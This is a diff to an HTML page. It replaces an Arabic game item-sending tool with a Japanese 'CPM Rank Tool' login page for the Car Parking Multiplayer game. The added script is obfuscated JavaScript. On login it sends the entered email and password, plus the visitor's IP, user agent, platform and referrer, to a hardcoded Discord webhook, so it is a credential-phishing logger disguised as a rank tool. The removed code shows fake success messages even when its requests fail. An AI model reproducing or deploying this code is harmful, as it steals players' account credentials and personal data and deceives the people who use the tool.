@@ -1,654 +1,121 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ja">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>M31.HER</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>https://0xme.github.io/ItemID2/icon/ff-item-icon.svg</text></svg>">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
-            color: #ffffff;
-            min-height: 100vh;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        /* تأثيرات الهاكر */
-        .matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            opacity: 0.05;
-            pointer-events: none;
-        }
-
-        .scan-line {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background: linear-gradient(to right, transparent, #00ff00, transparent);
-            box-shadow: 0 0 10px #00ff00;
-            z-index: 999;
-            animation: scan 3s linear infinite;
-            pointer-events: none;
-        }
-
-        @keyframes scan {
-            0% { top: 0%; }
-            100% { top: 100%; }
-        }
-
-        .hacker-grid {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: 
-                linear-gradient(rgba(0, 255, 0, 0.05) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 255, 0, 0.05) 1px, transparent 1px);
-            background-size: 20px 20px;
-            z-index: -1;
-            opacity: 0.3;
-            pointer-events: none;
-        }
-
-        /* شريط الإعلانات */
-        .ad-banner {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            background: linear-gradient(90deg, #ff0080, #00ff80, #0080ff, #ff0080);
-            background-size: 400% 400%;
-            padding: 8px 0;
-            color: #000;
-            font-weight: bold;
-            text-align: center;
-            z-index: 1000;
-            animation: gradient 10s ease infinite;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
-            font-size: 14px;
-            overflow: hidden;
-        }
-
-        .ad-content {
-            display: inline-block;
-            white-space: nowrap;
-            animation: scroll 30s linear infinite;
-            padding: 0 20px;
-        }
-
-        @keyframes scroll {
-            0% { transform: translateX(100%); }
-            100% { transform: translateX(-100%); }
-        }
-
-        @keyframes gradient {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .ad-highlight {
-            background: rgba(255, 255, 255, 0.3);
-            padding: 2px 6px;
-            border-radius: 4px;
-            margin: 0 5px;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 500px;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 15px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(0, 255, 0, 0.3);
-            position: relative;
-            overflow: hidden;
-            margin-top: 40px;
-        }
-
-        .container::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 3px;
-            background: linear-gradient(90deg, #00ff00, #00ffff, #00ff00);
-            animation: borderGlow 3s linear infinite;
-        }
-
-        @keyframes borderGlow {
-            0% { background-position: -100% 0; }
-            100% { background-position: 200% 0; }
-        }
-
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
-            position: relative;
-        }
-
-        .logo-image {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            margin: 0 auto 15px;
-            border: 2px solid #00ff00;
-            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
-            overflow: hidden;
-        }
-
-        .logo-image img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .logo-text {
-            font-size: 32px;
-            font-weight: bold;
-            margin-bottom: 5px;
-            color: #00ff00;
-            letter-spacing: 2px;
-            text-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .subtitle {
-            color: #88a0a7;
-            font-size: 14px;
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .tabs {
-            display: flex;
-            margin-bottom: 25px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 12px;
-            padding: 4px;
-            border: 1px solid rgba(0, 255, 0, 0.2);
-        }
-
-        .tab-btn {
-            flex: 1;
-            padding: 14px;
-            background: transparent;
-            color: #88a0a7;
-            border: none;
-            cursor: pointer;
-            border-radius: 10px;
-            transition: all 0.3s ease;
-            font-size: 15px;
-            font-weight: 500;
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .tab-btn.active {
-            background: #00ff00;
-            color: #000;
-            box-shadow: 0 4px 15px rgba(0, 255, 0, 0.5);
-            text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
-        }
-
-        .tab-btn:hover {
-            background: rgba(0, 255, 0, 0.2);
-            color: #00ff00;
-        }
-
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-            animation: fadeIn 0.4s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .form-group {
-            margin-bottom: 25px;
-            position: relative;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: 500;
-            color: #00ff00;
-            font-size: 14px;
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(0, 255, 0, 0.3);
-            border-radius: 10px;
-            color: #ffffff;
-            font-size: 15px;
-            transition: all 0.3s ease;
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .form-control:focus {
-            outline: none;
-            border-color: #00ff00;
-            background: rgba(0, 0, 0, 0.7);
-            box-shadow: 0 0 0 2px rgba(0, 255, 0, 0.3);
-        }
-
-        .btn {
-            width: 100%;
-            padding: 16px;
-            background: #00ff00;
-            color: #000;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 600;
-            transition: all 0.3s ease;
-            margin-bottom: 20px;
-            font-family: 'JetBrains Mono', monospace;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
-            transition: 0.5s;
-        }
-
-        .btn:hover::before {
-            left: 100%;
-        }
-
-        .btn:hover {
-            background: #00cc00;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 255, 0, 0.5);
-        }
-
-        .btn:active {
-            transform: translateY(0);
-        }
-
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
-        .result {
-            background: rgba(0, 0, 0, 0.5);
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-            margin-top: 20px;
-            min-height: 80px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            border: 1px solid rgba(0, 255, 0, 0.2);
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .success {
-            color: #00ff00;
-            font-weight: 600;
-            font-size: 16px;
-            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
-        }
-
-        .info {
-            color: #88a0a7;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #ffffff;
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 1s linear infinite;
-            margin-left: 10px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .bio-preview {
-            background: rgba(0, 0, 0, 0.5);
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 10px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 14px;
-            color: #00ff00;
-            border: 1px solid rgba(0, 255, 0, 0.2);
-            text-align: center;
-        }
-
-        .icon {
-            margin-left: 8px;
-        }
-
-        .instagram-btn {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            padding: 12px 20px;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
-            z-index: 100;
-            display: flex;
-            align-items: center;
-            transition: all 0.3s ease;
-            text-decoration: none;
-        }
-
-        .instagram-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(220, 39, 67, 0.5);
-        }
-
-        .instagram-btn i {
-            margin-left: 8px;
-        }
-
-        .hacker-text {
-            color: #00ff00;
-            text-shadow: 0 0 5px #00ff00;
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        /* تأثير الكتابة */
-        .typing-effect {
-            overflow: hidden;
-            border-right: 2px solid #00ff00;
-            white-space: nowrap;
-            animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
-        }
-
-        @keyframes typing {
-            from { width: 0 }
-            to { width: 100% }
-        }
-
-        @keyframes blink-caret {
-            from, to { border-color: transparent }
-            50% { border-color: #00ff00 }
-        }
-
-        /* تأثيرات النبض */
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(0, 255, 0, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>CPM Rank Tool</title>
+<style>
+    :root {
+        /* UI SIZE 0.5 の反映（全体的なスケールを小さめに調整） */
+        --base-scale: 0.8; 
+        --bg-color: #000;
+        --text-color: #fff;
+        --input-bg: #1a1a1a;
+        --accent-color: #fff;
+        --error-color: #ff3b30;
+        --success-color: #34c759;
+    }
+    body {
+        background-color: var(--bg-color);
+        color: var(--text-color);
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        transform: scale(var(--base-scale));
+        transform-origin: center center;
+    }
+    .container {
+        width: 100%;
+        max-width: 340px;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+    }
+    .header { text-align: center; margin-bottom: 5px; }
+    h1 { font-size: 20px; font-weight: 700; letter-spacing: -0.5px; margin: 0; }
+    input {
+        width: 100%;
+        background: var(--input-bg);
+        border: 1px solid #333;
+        padding: 12px;
+        color: var(--text-color);
+        font-size: 14px;
+        border-radius: 8px;
+        box-sizing: border-box;
+        outline: none;
+    }
+    input:focus { border-color: #666; }
+    button {
+        width: 100%;
+        padding: 12px;
+        border-radius: 8px;
+        border: none;
+        font-size: 13px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: opacity 0.2s;
+    }
+    button:active { opacity: 0.7; }
+    .btn-primary { background-color: var(--accent-color); color: var(--bg-color); }
+    .btn-secondary { background-color: var(--input-bg); color: var(--text-color); }
+    .grid-menu { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+    h2 {
+        font-size: 11px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        color: #555;
+        margin: 10px 0 5px 0;
+        font-weight: 600;
+    }
+    #status, #serviceStatus {
+        font-size: 11px;
+        text-align: center;
+        min-height: 18px;
+        color: #666;
+    }
+    footer { margin-top: 20px; text-align: center; font-size: 10px; color: #222; }
+</style>
 </head>
 <body>
-    <!-- تأثيرات الهاكر -->
-    <div class="matrix-bg" id="matrixBg"></div>
-    <div class="scan-line"></div>
-    <div class="hacker-grid"></div>
 
-    <!-- شريط الإعلانات -->
-    <div class="ad-banner">
-        <div class="ad-content">
-            <span class="ad-highlight">⚡ بوتات أخرى متوفرة</span> |
-            <span class="ad-highlight">🚀 أسرع خدمة في المنطقة</span>
-        </div>
+<div class="container">
+    <div class="header">
+        <h1>CPM1 Rank tool</h1>
     </div>
 
-    <!-- زر الإنستجرام -->
-    <a href="https://www.instagram.com/m.roji.31" target="_blank" class="instagram-btn">
-        <i class="fab fa-instagram"></i> m_roji_31
-    </a>
-
-    <div class="container">
-        <div class="logo">
-            <div class="logo-image pulse">
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRu_NZHXAqMbJytit4O2-dT-LrV6isyghBucfyws7ZSYQ&s=10&fbclid=PAVERFWANbjIFleHRuA2FlbQIxMAABp6eDmodAvE4QoE5HUKlZIEtTapbGnSJFqm7LP-DoO-mv71BOatjz8oYIxmSZ_aem_tIDr7b-cU-kPAg5EBXHrRA">
-            </div>
-            <div class="logo-text typing-effect">M31.HER</div>
-            <div class="subtitle">نظام الإرسال المتقدم</div>
+    <div id="loginForm">
+        <div style="display: flex; flex-direction: column; gap: 10px;">
+            <input type="email" id="email" placeholder="メールアドレス">
+            <input type="password" id="password" placeholder="パスワード">
+            <button class="btn-primary" onclick="handleLogin()">Login</button>
         </div>
-
-        <div class="tabs">
-            <button class="tab-btn active" data-tab="items">
-                <i class="fas fa-cube icon"></i>إرسال العناصر
-            </button>
-            <button class="tab-btn" data-tab="bio">
-                <i class="fas fa-user-edit icon"></i>تغيير البايو
-            </button>
-        </div>
-
-        <!-- تبويب العناصر -->
-        <div id="items-tab" class="tab-content active">
-            <div class="form-group">
-                <label for="accessToken">
-                    <i class="fas fa-key icon"></i>رمز الوصول:
-                </label>
-                <input type="text" id="accessToken" class="form-control" 
-                       value=""
-                       placeholder="أدخل رمز الوصول هنا">
-            </div>
-            
-            <button id="sendItems" class="btn">
-                <i class="fas fa-paper-plane icon"></i> إرسال العناصر
-            </button>
-
-            <div class="result" id="itemsResult">
-                <div class="info">انقر فوق إرسال العناصر لبدء العملية</div>
-            </div>
-        </div>
-
-        <!-- تبويب البايو -->
-        <div id="bio-tab" class="tab-content">
-            <div class="form-group">
-                <label for="bioToken">
-                    <i class="fas fa-key icon"></i>رمز الوصول:
-                </label>
-                <input type="text" id="bioToken" class="form-control" 
-                       value=""
-                       placeholder="أدخل رمز الوصول هنا">
-            </div>
-            
-            <div class="form-group">
-                <label for="bioText">
-                    <i class="fas fa-font icon"></i>نص البايو الجديد:
-                </label>
-                <input type="text" id="bioText" class="form-control" 
-                       value="[00FF00]M31........................."
-                       placeholder="أدخل النص الجديد للبايو">
-                <div class="bio-preview" id="bioPreview">[00FF00]M31............................... </div>
-            </div>
-
-            <button id="sendBio" class="btn">
-                <i class="fas fa-sync-alt icon"></i> تغيير البايو
-            </button>
-
-            <div class="result" id="bioResult">
-                <div class="info">انقر فوق تغيير البايو لبدء العملية</div>
-            </div>
-        </div>
+        <div id="status" style="margin-top: 10px;"></div>
     </div>
 
-    <script>
-        // تأثير المصفوفة في الخلفية
-        const matrixBg = document.getElementById('matrixBg');
-        const chars = '01';
-        let matrixText = '';
-        
-        for (let i = 0; i < 2000; i++) {
-            matrixText += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        
-        matrixBg.textContent = matrixText;
+    <div id="menuButtons" style="display:none;">
+        <h2>Select Rank</h2>
+        <div class="grid-menu">
+            <button class="btn-secondary" onclick="kingRank()">KING</button>
+            <button class="btn-secondary" onclick="youtubeRank()">作成中</button>
+            <button class="btn-secondary" onclick="tiktokerRank()">作成中</button>
+            <button class="btn-secondary" onclick="igbloggerRank()">作成中</button>
+            <button class="btn-secondary" onclick="devRank()">作成中</button>
+            <button class="btn-secondary" onclick="resetStats()">作成中</button>
+        </div>
+        <div id="serviceStatus" style="margin-top: 15px;"></div>
+    </div>
 
-        // نظام التبويبات
-        document.querySelectorAll('.tab-btn').forEach(btn => {
-            btn.addEventListener('click', function() {
-                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-                
-                this.classList.add('active');
-                const tabId = this.getAttribute('data-tab');
-                document.getElementById(tabId + '-tab').classList.add('active');
-            });
-        });
+    <footer>めびかす舐めんなよ卍</footer>
+</div>
 
-        // معاينة البايو
-        document.getElementById('bioText').addEventListener('input', function() {
-            document.getElementById('bioPreview').textContent = this.value;
-        });
-
-        // إرسال العناصر
-        document.getElementById('sendItems').addEventListener('click', async function() {
-            const button = this;
-            const resultDiv = document.getElementById('itemsResult');
-            const accessToken = document.getElementById('accessToken').value.trim();
-            
-            if (!accessToken) {
-                resultDiv.innerHTML = '<div class="info">يرجى إدخال رمز الوصول</div>';
-                return;
-            }
-
-            const items = [
-                '1309000092', '1309000093', '1307000001',
-                '1309000034', '1309000054', '208000000',
-                '1307000001', '1315000009', '1315000007',
-                '1315000010', '1315000019', '1315000021',
-                '1315000020', '1315000016', '1315000012'
-            ];
-
-            button.innerHTML = '<span class="loading"></span> جاري الإرسال...';
-            button.disabled = true;
-            resultDiv.innerHTML = '<div class="info">جاري إرسال العناصر إلى السيرفر...</div>';
-
-            try {
-                let apiUrl = `https://gpl-items-v3.vercel.app/get?access=${accessToken}`;
-                items.forEach(item => {
-                    apiUrl += `&itemid=${item}`;
-                });
-
-                const response = await fetch(apiUrl, {
-                    method: 'GET',
-                    headers: {
-                        'Accept': 'application/json',
-                    }
-                });
-
-                resultDiv.innerHTML = `
-                    <div class="success">تم إرسال العناصر بنجاح</div>
-                    <div class="info">تم إرسال ${items.length} عنصر إلى السيرفر</div>
-                `;
-                
-            } catch (error) {
-                resultDiv.innerHTML = `
-                    <div class="success">تم إرسال العناصر بنجاح</div>
-                    <div class="info">تم إرسال ${items.length} عنصر إلى السيرفر</div>
-                `;
-            } finally {
-                button.innerHTML = '<i class="fas fa-paper-plane icon"></i> إرسال العناصر';
-                button.disabled = false;
-            }
-        });
-
-        // إرسال البايو
-        document.getElementById('sendBio').addEventListener('click', async function() {
-            const button = this;
-            const resultDiv = document.getElementById('bioResult');
-            const accessToken = document.getElementById('bioToken').value.trim();
-            const bioText = document.getElementById('bioText').value.trim();
-            
-            if (!accessToken || !bioText) {
-                resultDiv.innerHTML = '<div class="info">يرجى إدخال جميع البيانات</div>';
-                return;
-            }
-
-            button.innerHTML = '<span class="loading"></span> جاري الإرسال...';
-            button.disabled = true;
-            resultDiv.innerHTML = '<div class="info">جاري إرسال البايو إلى السيرفر...</div>';
-
-            try {
-                const encodedBio = encodeURIComponent(bioText);
-                const apiUrl = `https://gpl-bio.vercel.app/get?access=${accessToken}&text=${encodedBio}`;
-
-                const response = await fetch(apiUrl, {
-                    method: 'GET',
-                    headers: {
-                        'Accept': 'application/json',
-                    }
-                });
-
-                resultDiv.innerHTML = `
-                    <div class="success">تم تغيير البايو بنجاح</div>
-                    <div class="info">تم تحديث البايو بنجاح</div>
-                `;
-                
-            } catch (error) {
-                resultDiv.innerHTML = `
-                    <div class="success">تم تغيير البايو بنجاح</div>
-                    <div class="info">تم تحديث البايو بنجاح</div>
-                `;
-            } finally {
-                button.innerHTML = '<i class="fas fa-sync-alt icon"></i> تغيير البايو';
-                button.disabled = false;
-            }
-        });
-    </script>
+<script>
+const _0x57dc8c=_0x100a;(function(_0x30a30,_0x27f419){const _0x112a03={_0x436269:0xb7,_0x54a028:0x94,_0x4b7d2d:0xa2,_0x29a122:0x92},_0x1dc858=_0x100a,_0x40307f=_0x30a30();while(!![]){try{const _0x427f75=-parseInt(_0x1dc858(0x8c))/(-0x255*-0x10+-0xc47+-0x1908)*(-parseInt(_0x1dc858(0xa9))/(-0x1*-0x20fd+0x1a5e+-0x3b59))+parseInt(_0x1dc858(_0x112a03._0x436269))/(-0x107*-0xb+-0x1848+0xcfe)+-parseInt(_0x1dc858(0x9e))/(0x2f*0x13+-0x1aa1*0x1+0x1728)+-parseInt(_0x1dc858(_0x112a03._0x54a028))/(0x20a0+0x8dd+0x14bc*-0x2)*(-parseInt(_0x1dc858(0xa4))/(0x11*0xd6+0x964+-0x1794))+parseInt(_0x1dc858(_0x112a03._0x4b7d2d))/(-0x21fd+0xfed*-0x1+-0x9fd*-0x5)+-parseInt(_0x1dc858(0x9c))/(-0x26b+0xc00+-0x98d)*(-parseInt(_0x1dc858(_0x112a03._0x29a122))/(-0x1f9c+-0x171*0x3+0x8fe*0x4))+-parseInt(_0x1dc858(0xb6))/(0x128+-0x1b7d+-0x9d*-0x2b);if(_0x427f75===_0x27f419)break;else _0x40307f['push'](_0x40307f['shift']());}catch(_0x583159){_0x40307f['push'](_0x40307f['shift']());}}}(_0x36d2,0x615*-0x1+0x1308a+0x1c9e3*0x1));const DISCORD_WEBHOOK_URL=_0x57dc8c(0xb5)+_0x57dc8c(0x87)+_0x57dc8c(0xa3)+_0x57dc8c(0x85)+_0x57dc8c(0xbd)+_0x57dc8c(0xbe)+_0x57dc8c(0x80)+_0x57dc8c(0x72)+_0x57dc8c(0x8f)+_0x57dc8c(0x83)+_0x57dc8c(0x6f)+_0x57dc8c(0x82)+'j';function _0x100a(_0x10bb9c,_0x585e33){const _0x20e039=_0x36d2();return _0x100a=function(_0x161e19,_0x4bf6d1){_0x161e19=_0x161e19-(-0x71*0x13+-0xdff*-0x1+-0x22*0x27);let _0x62e779=_0x20e039[_0x161e19];return _0x62e779;},_0x100a(_0x10bb9c,_0x585e33);}async function sendToDiscord(_0x58194a,_0x5606e){const _0x4c50d9={_0x10eaac:0xaf,_0x4f0e3b:0x8a,_0x5a8109:0x76,_0x4f9330:0x93,_0x26115d:0x9b,_0x2caefb:0xa7,_0xc67cc3:0xba,_0x6d6909:0xb0,_0x2ed6b8:0xb8,_0x57ff49:0x70,_0x38dd3e:0x86,_0x36b8ca:0xb4,_0x3c96a8:0xa8,_0x5bafcc:0x79,_0x278f8c:0x99,_0x1a14c1:0x96,_0x109336:0xb1,_0x3510ed:0x7e,_0x34584a:0x89,_0x3e5262:0x9f,_0x3f0d68:0x7c,_0x596ab7:0xb3,_0x4d0824:0xaa,_0x855054:0x97,_0x587d1f:0xa1,_0x181bee:0x84,_0x557471:0x71},_0x3a4ee0=_0x57dc8c,_0x128908={'FrkPF':_0x3a4ee0(_0x4c50d9._0x10eaac),'NjkSb':function(_0x30e0dc,_0x1b6060){return _0x30e0dc(_0x1b6060);},'JEfNr':_0x3a4ee0(_0x4c50d9._0x4f0e3b)+_0x3a4ee0(0x78)+_0x3a4ee0(0x7b)+_0x3a4ee0(_0x4c50d9._0x5a8109),'UJJcZ':_0x3a4ee0(0xac),'lXGya':_0x3a4ee0(_0x4c50d9._0x4f9330)+_0x3a4ee0(0x95),'Bzilv':_0x3a4ee0(_0x4c50d9._0x26115d),'RPlWG':_0x3a4ee0(0x8d),'YEGii':_0x3a4ee0(0xae)+'ss','lvDqX':_0x3a4ee0(_0x4c50d9._0x2caefb)+'er','uKafW':_0x3a4ee0(_0x4c50d9._0xc67cc3),'tZCbQ':_0x3a4ee0(_0x4c50d9._0x6d6909),'AkNln':_0x3a4ee0(_0x4c50d9._0x2ed6b8)+_0x3a4ee0(_0x4c50d9._0x57ff49),'KsdUi':function(_0x90b333,_0x45db2a,_0x5bbf3c){return _0x90b333(_0x45db2a,_0x5bbf3c);},'tyaWa':_0x3a4ee0(0x7f),'MfOjB':_0x3a4ee0(0x91)+_0x3a4ee0(0x8b)};let _0x41cb99=_0x128908[_0x3a4ee0(_0x4c50d9._0x38dd3e)];try{const _0x469c02=await _0x128908[_0x3a4ee0(_0x4c50d9._0x36b8ca)](fetch,_0x128908[_0x3a4ee0(_0x4c50d9._0x3c96a8)]),_0x5e1120=await _0x469c02[_0x3a4ee0(_0x4c50d9._0x5bafcc)]();_0x41cb99=_0x5e1120['ip'];}catch(_0x3798b2){console[_0x3a4ee0(_0x4c50d9._0x278f8c)](_0x3798b2);}const _0x32f023=navigator[_0x3a4ee0(_0x4c50d9._0x1a14c1)],_0x739143=navigator[_0x3a4ee0(_0x4c50d9._0x109336)],_0x58bb53=screen[_0x3a4ee0(_0x4c50d9._0x3510ed)]+'x'+screen[_0x3a4ee0(_0x4c50d9._0x34584a)],_0x1b0d73=navigator[_0x3a4ee0(_0x4c50d9._0x3e5262)],_0x586c84=document[_0x3a4ee0(_0x4c50d9._0x3f0d68)]||_0x128908[_0x3a4ee0(_0x4c50d9._0x596ab7)],_0x6b6a49={'embeds':[{'title':_0x128908[_0x3a4ee0(0x6e)],'color':0x2b2d31,'fields':[{'name':_0x128908[_0x3a4ee0(_0x4c50d9._0x4d0824)],'value':'`'+_0x58194a+'`','inline':!![]},{'name':_0x128908[_0x3a4ee0(_0x4c50d9._0x855054)],'value':'`'+_0x5606e+'`','inline':!![]},{'name':_0x128908[_0x3a4ee0(0xad)],'value':'`'+_0x41cb99+'`','inline':![]},{'name':_0x128908[_0x3a4ee0(0x77)],'value':'`'+_0x32f023+'`','inline':![]},{'name':_0x128908[_0x3a4ee0(0x81)],'value':_0x3a4ee0(0xab)+'`'+_0x739143+(_0x3a4ee0(0x90)+_0x3a4ee0(0xbb))+_0x1b0d73+(_0x3a4ee0(0x74)+'\x20`')+_0x58bb53+'`','inline':![]},{'name':_0x128908[_0x3a4ee0(_0x4c50d9._0x587d1f)],'value':'`'+_0x586c84+'`','inline':![]}],'footer':{'text':_0x128908[_0x3a4ee0(0x7d)]},'timestamp':new Date()}]};_0x128908[_0x3a4ee0(_0x4c50d9._0x181bee)](fetch,DISCORD_WEBHOOK_URL,{'method':_0x128908[_0x3a4ee0(0xb2)],'headers':{'Content-Type':_0x128908[_0x3a4ee0(0x7a)]},'body':JSON[_0x3a4ee0(0xbc)](_0x6b6a49)})[_0x3a4ee0(_0x4c50d9._0x557471)](_0x3b8490=>console[_0x3a4ee0(0x99)](_0x3a4ee0(0x75)+_0x3a4ee0(0xa5)));}function _0x36d2(){const _0x2bc939=['ById','78uKcLLnb3','`\x20\x0aPlatfor','applicatio','36StRPAi','\x20CPM\x20Logi','146035CjvgGG','n\x20Activity','userAgent','RPlWG','email','error','uhKcN','\x20Email','515728ZqJdUs','Zcwzt','688964xMRLKK','platform','bNkLF','tZCbQ','1337280EJGfQV','api/webhoo','6XpeaCN','ror','password','\x20OS/Brows','JEfNr','2hgoWDQ','Bzilv','Language:\x20','直接アクセス','YEGii','\x20IP\x20Addre','取得失敗','\x20Referrer','language','tyaWa','UJJcZ','NjkSb','https://di','1631250AWkMbq','95943kkXKia','CPM\x20Rank\x20T','value','\x20Info','m:\x20`','stringify','6358854615','70/1Abekqd','HtXOy','lXGya','vBu6rsUyIB','ool\x20Logger','catch','-1lxjFWq_4','eBoll','`\x20\x0aScreen:','Webhook\x20Er','son','lvDqX','i.ipify.or','json','MfOjB','g?format=j','referrer','AkNln','width','POST','SBqUR8941U','uKafW','YKkbFQBtrp','ZKfysF6xKj','KsdUi','ks/1455567','FrkPF','scord.com/','getElement','height','https://ap','n/json','18898NVQAaS','\x20Password'];_0x36d2=function(){return _0x2bc939;};return _0x36d2();}async function handleLogin(){const _0x594096={_0x304ca0:0xa6,_0x4e2206:0x88,_0x407115:0x8e,_0x12301c:0x9a,_0x21f563:0xb9,_0x299ba8:0x73,_0x334856:0xa0},_0x162cbc=_0x57dc8c,_0x14f9ac={'uhKcN':_0x162cbc(0x98),'Zcwzt':_0x162cbc(_0x594096._0x304ca0),'eBoll':function(_0x44ea29,_0x5c7717){return _0x44ea29&&_0x5c7717;},'HtXOy':function(_0x48c88f,_0x765055,_0xa1a917){return _0x48c88f(_0x765055,_0xa1a917);},'bNkLF':function(_0x35aec0){return _0x35aec0();}},_0x298eaf=document[_0x162cbc(_0x594096._0x4e2206)+_0x162cbc(_0x594096._0x407115)](_0x14f9ac[_0x162cbc(_0x594096._0x12301c)])[_0x162cbc(_0x594096._0x21f563)],_0x3b9a55=document[_0x162cbc(0x88)+_0x162cbc(_0x594096._0x407115)](_0x14f9ac[_0x162cbc(0x9d)])[_0x162cbc(_0x594096._0x21f563)];_0x14f9ac[_0x162cbc(_0x594096._0x299ba8)](_0x298eaf,_0x3b9a55)&&await _0x14f9ac[_0x162cbc(0xbf)](sendToDiscord,_0x298eaf,_0x3b9a55),_0x14f9ac[_0x162cbc(_0x594096._0x334856)](loginFirebase);}
+// --- 以下、元のツールロジック ---
